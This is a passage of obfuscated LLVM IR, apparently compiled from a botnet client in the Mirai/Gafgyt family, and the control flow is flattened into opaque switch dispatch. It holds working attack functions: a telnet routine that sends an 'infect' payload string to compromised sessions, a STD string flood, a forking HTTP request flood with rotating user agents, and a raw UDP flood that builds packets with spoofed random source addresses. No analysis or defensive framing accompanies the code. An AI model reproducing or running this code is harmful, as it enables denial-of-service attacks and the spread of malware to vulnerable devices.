  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 0
  %670 = load i32, i32* %669, align 16
  %671 = call i64 @send(i32 %670, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.350, i32 0, i32 0), i64 7, i32 16384)
  %672 = icmp slt i64 %671, 0
  %673 = select i1 %672, i32 -1253952496, i32 630078347
  store i32 %673, i32* %switchVar
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
  store i32 630078347, i32* %switchVar
  br label %loopEnd

; <label>:675:                                    ; preds = %loopEntry
  %676 = load i32, i32* %5, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 0
  %680 = load i32, i32* %679, align 16
  %681 = load i8*, i8** @infect, align 8
  %682 = load i8*, i8** @infect, align 8
  %683 = call i64 @strlen(i8* %682) #10
  %684 = call i64 @send(i32 %680, i8* %681, i64 %683, i32 16384)
  %685 = icmp slt i64 %684, 0
  %686 = select i1 %685, i32 -1946142150, i32 221557552
  store i32 %686, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %5, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %689
  call void @reset_telstate(%struct.telstate_t* %690)
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = load i32, i32* %5, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 7
  %696 = load i32, i32* %695, align 16
  %697 = add i32 %696, 25
  %698 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %699 = icmp ult i32 %697, %698
  %700 = select i1 %699, i32 892252023, i32 -1290934989
  store i32 %700, i32* %switchVar
  br label %loopEnd

; <label>:701:                                    ; preds = %loopEntry
  %702 = load i32, i32* %5, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 3
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i32
  %708 = icmp ne i32 %707, 3
  %709 = select i1 %708, i32 -1810293277, i32 -937268529
  store i32 %709, i32* %switchVar
  br label %loopEnd

; <label>:710:                                    ; preds = %loopEntry
  store i32 -937268529, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  %712 = load i32, i32* %5, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %713
  call void @reset_telstate(%struct.telstate_t* %714)
  store i32 -1290934989, i32* %switchVar
  br label %loopEnd

; <label>:715:                                    ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:716:                                    ; preds = %loopEntry
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:717:                                    ; preds = %loopEntry
  %718 = load i32, i32* %5, align 4
  %719 = add nsw i32 %718, 1
  store i32 %719, i32* %5, align 4
  store i32 694418056, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  store i32 292479787, i32* %switchVar
  br label %loopEnd

; <label>:721:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %720, %717, %716, %NewDefault, %715, %711, %710, %701, %691, %687, %675, %674, %665, %664, %650, %649, %645, %635, %634, %633, %629, %628, %602, %598, %589, %580, %576, %562, %547, %543, %539, %530, %526, %500, %499, %495, %485, %484, %480, %476, %467, %452, %448, %444, %435, %431, %405, %404, %400, %390, %389, %385, %381, %372, %357, %356, %352, %342, %341, %337, %333, %332, %315, %311, %300, %266, %265, %256, %255, %254, %250, %246, %241, %218, %217, %192, %191, %190, %185, %176, %171, %150, %141, %121, %112, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %96, %90, %82, %77, %76, %75, %74, %73, %65, %64, %61, %47, %42, %switchDefault
  br label %loopEntry
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 12667910, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 12667910, label %39
    i32 552522773, label %49
    i32 -315688148, label %64
    i32 -1793208277, label %67
    i32 -914665933, label %68
    i32 836589696, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  %48 = select i1 %47, i32 552522773, i32 -914665933
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = load i8*, i8** %13, align 8
  %52 = call i64 @send(i32 %50, i8* %51, i64 65, i32 0)
  %53 = load i32, i32* %7, align 4
  %54 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %55 = call i32 @connect(i32 %53, %struct.sockaddr* %54, i32 16)
  %56 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %57 = sext i32 %56 to i64
  %58 = load i64, i64* %8, align 8
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = icmp sge i64 %57, %61
  %63 = select i1 %62, i32 -315688148, i32 -1793208277
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #12
  unreachable

; <label>:67:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -914665933, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %11, align 4
  %70 = add i32 %69, 1
  store i32 %70, i32* %11, align 4
  store i32 12667910, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %68, %67, %49, %39, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = add nsw i32 %19, %20
  store i32 %21, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 1256018924, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1256018924, label %22
    i32 286524424, label %27
    i32 -1687317130, label %41
    i32 -479099360, label %42
    i32 -2142671496, label %47
    i32 -716194784, label %54
    i32 325714454, label %65
    i32 1261001915, label %66
    i32 1596551507, label %67
    i32 317151683, label %68
    i32 -320660932, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %14, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 286524424, i32 -320660932
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %29 = load i8*, i8** %7, align 8
  %30 = load i8*, i8** %10, align 8
  %31 = load i8*, i8** %8, align 8
  %32 = call i32 @rand() #2
  %33 = srem i32 %32, 36
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [789 x i8*], [789 x i8*]* @UserAgents, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.387, i32 0, i32 0), i8* %29, i8* %30, i8* %31, i8* %36) #2
  %38 = call i32 @fork() #2
  %39 = icmp ne i32 %38, 0
  %40 = select i1 %39, i32 -1687317130, i32 1596551507
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 -479099360, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %15, align 4
  %44 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %45 = icmp sgt i32 %43, %44
  %46 = select i1 %45, i32 -2142671496, i32 1261001915
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -716194784, i32 325714454
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %13, align 4
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = call i64 @strlen(i8* %57) #10
  %59 = call i64 @write(i32 %55, i8* %56, i64 %58)
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %62 = call i64 @read(i32 %60, i8* %61, i64 1)
  %63 = load i32, i32* %13, align 4
  %64 = call i32 @close(i32 %63)
  store i32 325714454, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -479099360, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:67:                                     ; preds = %loopEntry
  store i32 317151683, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %14, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %14, align 4
  store i32 1256018924, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %68, %67, %65, %54, %47, %42, %41, %27, %22, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 440435180, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 440435180, label %first
    i32 1768266042, label %38
    i32 -788691030, label %42
    i32 907406699, label %47
    i32 1798935245, label %53
    i32 -288631840, label %54
    i32 2036475777, label %61
    i32 -901157559, label %66
    i32 1254058247, label %67
    i32 397755205, label %75
    i32 -688594222, label %76
    i32 1666461987, label %86
    i32 185401219, label %97
    i32 -905749342, label %101
    i32 750667501, label %105
    i32 989450758, label %110
    i32 -2125456461, label %111
    i32 2112493519, label %112
    i32 1032823884, label %119
    i32 -1470750762, label %123
    i32 -1188614464, label %126
    i32 -1348529473, label %127
    i32 -719150578, label %132
    i32 -2068396183, label %133
    i32 -1886997706, label %139
    i32 1601951856, label %140
    i32 1040796349, label %141
    i32 1588984264, label %146
    i32 298962290, label %151
    i32 -1547712455, label %155
    i32 1575360994, label %156
    i32 1273367026, label %162
    i32 876831321, label %202
    i32 -893933534, label %204
    i32 -1810551639, label %209
    i32 1999141863, label %234
    i32 2037189704, label %235
    i32 1847070959, label %248
    i32 -998437961, label %250
    i32 -302672446, label %255
    i32 744012810, label %282
    i32 1909302970, label %287
    i32 1981200691, label %288
    i32 1489371752, label %289
    i32 508704529, label %296
    i32 348361013, label %300
    i32 719902354, label %303
    i32 -1264421948, label %305
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp eq i32 %.reload, 0
  %37 = select i1 %36, i32 1768266042, i32 -788691030
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  store i32 907406699, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  store i32 907406699, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 1798935245, i32 -288631840
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  %60 = select i1 %59, i32 2036475777, i32 -1348529473
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 1254058247, i32 -901157559
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %13, align 4
  %69 = add nsw i32 %68, 1
  %70 = sext i32 %69 to i64
  %71 = call noalias i8* @malloc(i64 %70) #2
  store i8* %71, i8** %20, align 8
  %72 = load i8*, i8** %20, align 8
  %73 = icmp eq i8* %72, null
  %74 = select i1 %73, i32 397755205, i32 -688594222
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i8*, i8** %20, align 8
  %78 = load i32, i32* %13, align 4
  %79 = add nsw i32 %78, 1
  %80 = sext i32 %79 to i64
  call void @llvm.memset.p0i8.i64(i8* %77, i8 0, i64 %80, i32 1, i1 false)
  %81 = load i8*, i8** %20, align 8
  %82 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %81, i32 %82)
  %83 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %84 = load i32, i32* %11, align 4
  %85 = add nsw i32 %83, %84
  store i32 %85, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 1666461987, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %19, align 4
  %88 = load i8*, i8** %20, align 8
  %89 = load i32, i32* %13, align 4
  %90 = sext i32 %89 to i64
  %91 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %92 = call i64 @sendto(i32 %87, i8* %88, i64 %90, i32 0, %struct.sockaddr* %91, i32 16)
  %93 = load i32, i32* %22, align 4
  %94 = load i32, i32* %18, align 4
  %95 = icmp eq i32 %93, %94
  %96 = select i1 %95, i32 185401219, i32 2112493519
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i32, i32* %10, align 4
  %99 = icmp eq i32 %98, 0
  %100 = select i1 %99, i32 -905749342, i32 750667501
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 @rand_cmwc()
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %103, i16* %104, align 2
  store i32 750667501, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = load i32, i32* %21, align 4
  %108 = icmp sgt i32 %106, %107
  %109 = select i1 %108, i32 989450758, i32 -2125456461
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 -1188614464, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 1666461987, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %22, align 4
  %114 = add i32 %113, 1
  store i32 %114, i32* %22, align 4
  %115 = load i32, i32* %23, align 4
  %116 = load i32, i32* %15, align 4
  %117 = icmp eq i32 %115, %116
  %118 = select i1 %117, i32 1032823884, i32 -1470750762
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %16, align 4
  %121 = mul nsw i32 %120, 1000
  %122 = call i32 @usleep(i32 %121)
  store i32 0, i32* %23, align 4
  store i32 1666461987, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %23, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %23, align 4
  store i32 1666461987, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %128, i32* %24, align 4
  %129 = load i32, i32* %24, align 4
  %130 = icmp ne i32 %129, 0
  %131 = select i1 %130, i32 -2068396183, i32 -719150578
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %134 = load i32, i32* %24, align 4
  %135 = bitcast i32* %25 to i8*
  %136 = call i32 @setsockopt(i32 %134, i32 0, i32 3, i8* %135, i32 4) #2
  %137 = icmp slt i32 %136, 0
  %138 = select i1 %137, i32 -1886997706, i32 1601951856
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  store i32 -1264421948, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  store i32 50, i32* %26, align 4
  store i32 1040796349, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i32, i32* %26, align 4
  %143 = add nsw i32 %142, -1
  store i32 %143, i32* %26, align 4
  %144 = icmp ne i32 %142, 0
  %145 = select i1 %144, i32 1588984264, i32 298962290
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %148 = call i32 @rand_cmwc()
  %149 = xor i32 %147, %148
  call void @srand(i32 %149) #2
  %150 = call i32 @rand() #2
  call void @init_rand(i32 %150)
  store i32 1040796349, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* %12, align 4
  %153 = icmp eq i32 %152, 0
  %154 = select i1 %153, i32 -1547712455, i32 1575360994
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 1273367026, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %12, align 4
  %158 = sub nsw i32 32, %157
  %159 = shl i32 1, %158
  %160 = sub nsw i32 %159, 1
  %161 = xor i32 %160, -1
  store i32 %161, i32* %27, align 4
  store i32 1273367026, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %13, align 4
  %164 = sext i32 %163 to i64
  %165 = add i64 28, %164
  store i64 %165, i64* %.reg2mem2
  %166 = call i8* @llvm.stacksave()
  store i8* %166, i8** %28, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %167 = alloca i8, i64 %.reload4, align 16
  store i8* %167, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %168 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %29, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = getelementptr i8, i8* %170, i64 20
  %172 = bitcast i8* %171 to %struct.udphdr*
  store %struct.udphdr* %172, %struct.udphdr** %30, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 4
  %177 = load i32, i32* %27, align 4
  %178 = call i32 @GetRandomIP(i32 %177)
  %179 = call i32 @htonl(i32 %178) #13
  %180 = load i32, i32* %13, align 4
  %181 = sext i32 %180 to i64
  %182 = add i64 8, %181
  %183 = trunc i64 %182 to i32
  call void @makeIPPacket(%struct.iphdr* %173, i32 %176, i32 %179, i8 zeroext 17, i32 %183)
  %184 = load i32, i32* %13, align 4
  %185 = sext i32 %184 to i64
  %186 = add i64 8, %185
  %187 = trunc i64 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #13
  %189 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.2* %190 to %struct.anon.3*
  %192 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %191, i32 0, i32 2
  store i16 %188, i16* %192, align 2
  %193 = call i32 @rand_cmwc()
  %194 = trunc i32 %193 to i16
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 0
  %197 = bitcast %union.anon.2* %196 to %struct.anon.3*
  %198 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %197, i32 0, i32 0
  store i16 %194, i16* %198, align 2
  %199 = load i32, i32* %10, align 4
  %200 = icmp eq i32 %199, 0
  %201 = select i1 %200, i32 876831321, i32 -893933534
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = call i32 @rand_cmwc()
  store i32 -1810551639, i32* %switchVar
  store i32 %203, i32* %.reg2mem10
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i32, i32* %10, align 4
  %206 = trunc i32 %205 to i16
  %207 = call zeroext i16 @htons(i16 zeroext %206) #13
  %208 = zext i16 %207 to i32
  store i32 -1810551639, i32* %switchVar
  store i32 %208, i32* %.reg2mem10
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %210 = trunc i32 %.reload11 to i16
